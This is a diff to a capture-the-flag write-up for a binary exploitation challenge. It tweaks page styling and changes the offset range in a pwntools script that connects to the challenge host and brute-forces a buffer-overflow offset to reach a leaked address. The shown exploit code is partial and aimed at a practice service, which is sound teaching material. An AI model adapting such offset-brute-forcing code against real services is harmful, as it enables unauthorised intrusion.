@@ -16,6 +16,8 @@ thumbnail: /asset/banner/banner-darkside.png
         padding: 1rem;
         font-size: 90%;
         text-align: center;
+        margin-top: 1rem;
+        margin-bottom: 1rem;
     }
     .flex-container {
         display: flex;
@@ -24,15 +26,17 @@ thumbnail: /asset/banner/banner-darkside.png
     }
 </style>
 
-<p class="box">Once you start down the dark path, forever will it dominate your destiny.<br>
-(And yes, the binary isn't included)<br>
-<code>nc 0.cloud.chals.io 30096</code><br>
-<b>Author</b>: v10l3nt</p>
+<div class="box">
+    Once you start down the dark path, forever will it dominate your destiny.<br>
+    (And yes, the binary isn't included)<br>
+    <code>nc 0.cloud.chals.io 30096</code><br>
+    <b>Author</b>: v10l3nt
+</div>
 
 Let's run that `netcat` link to see what's going on:
 
-```text
-kali@kali:~/shctf/pwn/warmup-to-the-dark-side$ nc 0.cloud.chals.io 30096
+```console
+$ nc 0.cloud.chals.io 30096
 The Dark Side Of The Force, Are They. Easily They Flow, Quick To Join You In A Fight. The Dark Side resides at: 0x55a6b42f020c
 Jedi Mind tricks dont work on me >>> 
 ```
@@ -43,7 +47,7 @@ In the code snippet below, I got the address provided in the prompt by reading t
 
 ```py
 from pwn import *
-for i in range(0,100):
+for i in range(32,128):
         p = remote("0.cloud.chals.io", 30096)
         address = p.readlineS()[112:126]
         log.info("Trying offset " + str(i) + " for address " + address)
